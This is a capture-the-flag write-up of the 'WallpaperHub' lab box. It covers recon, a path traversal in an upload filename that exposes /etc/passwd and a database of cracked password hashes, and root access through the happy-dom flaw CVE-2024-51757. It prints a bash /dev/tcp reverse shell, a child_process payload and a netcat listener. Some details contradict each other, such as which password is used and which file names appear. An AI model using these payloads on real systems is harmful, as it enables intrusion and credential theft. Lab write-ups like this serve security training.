# CTF Writeup: WallpaperHub

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.240.204
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-01 12:59 -0500
Nmap scan report for 192.168.240.204
Host is up (0.032s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
|_http-title: Wallpaper Hub - Home
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (95%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (95%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.15 (90%), OpenWrt 22.03 (Linux 5.10) (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   36.07 ms 192.168.45.1
2   36.02 ms 192.168.45.254
3   36.18 ms 192.168.251.1
4   36.22 ms 192.168.240.204

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.36 seconds
```

The website running on port 80 seems to be an default Slick webpage.

Let's enumerate endpoints.

Since I there is no endpoints configured, I will move on to the 2. webpage running on port 5000.

This seems to be the Wallpaper Hub Webpage.

Enumerated endpoints.

```
feroxbuster -u http://192.168.240.204:5000
                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.240.204:5000/
 🚩  In-Scope Url          │ 192.168.240.204
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        5l       22w      199c http://192.168.240.204:5000/logout => http://192.168.240.204:5000/login
200      GET       28l       61w      933c http://192.168.240.204:5000/login
200      GET      144l      308w     2871c http://192.168.240.204:5000/static/css/login.css
200      GET       27l       62w      847c http://192.168.240.204:5000/register
200      GET       95l      212w     1870c http://192.168.240.204:5000/static/css/home.css
302      GET        5l       22w      199c http://192.168.240.204:5000/subscriptions => http://192.168.240.204:5000/login
302      GET        5l       22w      199c http://192.168.240.204:5000/settings => http://192.168.240.204:5000/login
302      GET        5l       22w      199c http://192.168.240.204:5000/dashboard => http://192.168.240.204:5000/login
200      GET      277l      688w    13842c http://192.168.240.204:5000/gallery
200      GET       28l       92w     1132c http://192.168.240.204:5000/
200      GET      351l      795w     6951c http://192.168.240.204:5000/static/css/magnific-popup.css
200      GET      141l      394w     4979c http://192.168.240.204:5000/static/js/hero-slider-main.js
200      GET      172l      393w     3238c http://192.168.240.204:5000/static/css/gallery.css
200      GET        4l      212w    20216c http://192.168.240.204:5000/static/js/jquery.magnific-popup.min.js
200      GET        4l       63w    27466c http://192.168.240.204:5000/static/css/font-awesome.min.css
200      GET      879l     2224w    21032c http://192.168.240.204:5000/static/css/tooplate-style.css
200      GET      698l     1807w    17894c http://192.168.240.204:5000/static/css/hero-slider-style.css
200      GET        7l      557w    44826c http://192.168.240.204:5000/static/js/bootstrap.min.js
200      GET        6l      983w    95563c http://192.168.240.204:5000/static/css/bootstrap.min.css
200      GET        6l     1415w    95992c http://192.168.240.204:5000/static/js/jquery-1.11.3.min.js
200      GET     3591l    20490w  1567348c http://192.168.240.204:5000/static/wallpapers/photo2.jpg
200      GET     7505l    44105w  3258592c http://192.168.240.204:5000/static/wallpapers/photo3.jpg
200      GET     9514l    55037w  4409630c http://192.168.240.204:5000/static/wallpapers/photo1.jpg
[####################] - 51s    30028/30028   0s      found:23      errors:0      
[####################] - 51s    30000/30000   590/s   http://192.168.240.204:5000/
```

The webpage provides us with an login panel and also an registration functionality, but no version information!

I registered an account and logged into the CMS. There seems to be an file upload functionality for wallpapers, but also for user profile images.

My intuition is telling me, that we should utilize the Profile Image functionality first, maybe we can upload an malicious file!

Nvm. it won't let us upload anything, i'm assuming it's just visual.

Let's utilize the wallpaper upload functionality.

Analyzing the file upload, is interesting because once we upload the file it's getting saved as a file on the /my-uploads endpoint. Could we perhaps utilize LFI within the filename parameter to view system files?

Utilized the following PoC in order to download the passwd file from the target server.

```
Content-Disposition: form-data; name="file"; filename="../../../../../../../etc/passwd"
```

Retrieved the /etc/passwd file

```
cat passwd                
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
wp_hub:x:1001:1001::/home/wp_hub:/bin/bash
```

I then decided to view the .bash_history for the wp_hub user.

```
cat /home/saitama/Downloads/bash_history 
sqlite3 ~/wallpaper_hub/database.db
```

There seems to be an database.db file inside /home/wp_hub/wallpaper_hub, let's download it!

```
file database.db                          
database.db: SQLite 3.x database
```

Let's utilize sqlitebrowser to view the database.

Retrieved the following credentials:

```
wp_hub	$2b$12$lgsrjRa0imePu9iSnp1UsOPLWqAKKYym/z5R59UijsYZ5ss1nwijS
root	$2b$12$Y4c0uWiRNoDkdIVtbX5ukeBY6KISyUAetGYWRnwg/exGqeLb8zVQW
```

We got hashes for 2 users, let's decode them.

```
wp_hub:password
root:qazwsxedc
```

Logged into user "wp_hub" via ssh with wp_hub:qazwsxedc.

```
ssh wp_hub@192.168.240.204                  
The authenticity of host '192.168.240.204 (192.168.240.204)' can't be established.
ED25519 key fingerprint is: SHA256:GYats4sApIm2CiXiv6CqklOr+LDIDCrer/01h6J9yFg
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:89: [hashed name]
    ~/.ssh/known_hosts:97: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.240.204' (ED25519) to the list of known hosts.
wp_hub@192.168.240.204's password: 
Permission denied, please try again.
wp_hub@192.168.240.204's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jan  1 06:57:24 PM UTC 2026

  System load:  0.0               Processes:               161
  Usage of /:   54.0% of 9.75GB   Users logged in:         0
  Memory usage: 14%               IPv4 address for ens192: 192.168.240.204
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

185 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

wp_hub@wallpaperhub:~$
```

Retrieved local.txt in /home/wp_hub directory.

```
01935282fbc64e95f6ef62f0923792bf
```

## Privilege Escalation

Upon inspecting sudo permissions for user "wp_hub" we identified that he can rub the web-scraper binary with sudo permissions.

```
wp_hub@wallpaperhub:/home$ sudo -l
Matching Defaults entries for wp_hub on wallpaperhub:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !env_reset

User wp_hub may run the following commands on wallpaperhub:
    (root) NOPASSWD: /usr/bin/web-scraper /root/web_src_downloaded/*.html
```

We get information about "happy-dom". Let's search up CVE's for this.

```
wp_hub@wallpaperhub:/home$ cat /usr/bin/web-scraper
#!/usr/bin/env node

const fs = require('fs');
const { Window } = require("happy-dom");

// Check if a file path is provided as a command-line argument
const filePath = process.argv[2];

if (!filePath) {
    console.error('Please provide a file path as an argument.');
    process.exit(1);
}

const window = new Window();
const document = window.document;

// Read the content of the provided file path
fs.readFile(filePath, 'utf-8', (err, data) => {
    if (err) {
        console.error(`Error reading file ${filePath}:`, err);
        return;
    }

    // Use document.write() to add the content to the document
    document.write(data);

    // Log all external imports (scripts, stylesheets, meta tags)
    const links = document.querySelectorAll('link');
    const scripts = document.querySelectorAll('script');
    const metaTags = document.querySelectorAll('meta');
    
    console.log('----------------------------');
    // Output the links (CSS imports)
    console.log('CSS Links:');
    links.forEach(link => {
        console.log(link.href);
    });

    console.log('----------------------------');

    // Output the scripts (JS imports)
    console.log('JavaScript Links:');
    scripts.forEach(script => {
        if (script.src) {
            console.log(script.src);
        } else {
            console.log('Inline script found.');
        }
    });

    console.log('----------------------------');

    // Output the meta tags (for metadata)
    console.log('Meta Tags:');
    metaTags.forEach(meta => {
        console.log(`Name: ${meta.name}, Content: ${meta.content}`);
    });

    console.log('----------------------------');
});

```

I found CVE-2024-51757.

```
happy-dom is a JavaScript implementation of a web browser without its graphical user interface. Versions of happy-dom prior to 15.10.2 may execute code on the host via a script tag. This would execute code in the user context of happy-dom. Users are advised to upgrade to version 15.10.2. There are no known workarounds for this vulnerability.
```

Utilized the following article in order to replicate the exploit.

```
https://security.snyk.io/vuln/SNYK-JS-HAPPYDOM-8350065?source=post_page-----26b28458bf50---------------------------------------
```

I therefore will add two malicious scripts in the /tmp directory, in order to execute the initial script we will use directory traversal.

```
sudo /usr/bin/web-scraper /root/web_src_downloaded/../../tmp/pwned.html
```

Created an reverse shell .sh script which we will recall in our malicious .html script.

```
wp_hub@wallpaperhub:/tmp$ cat shell.sh 
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.191/5000 0>&1'
```

Created an malicious .html script which executes our .sh script.

```
wp_hub@wallpaperhub:/tmp$ cat website.html 
const { Window } = require("happy-dom");

const window = new Window();
const document = window.document;

document.write('<script src="https://localhost:8000/'+require('child_process').execSync('/tmp/shell.sh')+'"></script>');
```

Started up an listener on port 5000.

```
nc -lvnp 5000
```

Executed the following command.

```
wp_hub@wallpaperhub:/tmp$ sudo /usr/bin/web-scraper /root/web_src_downloaded/../../tmp/website.html
```

Gained RCE as user "root".

```
nc -lvnp 5000
listening on [any] 5000 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.240.204] 43532
root@wallpaperhub:/tmp#
```

Retrieved proof.txt in /root directory.

```
7812213a7f2af22021815985ea1adb6c
```
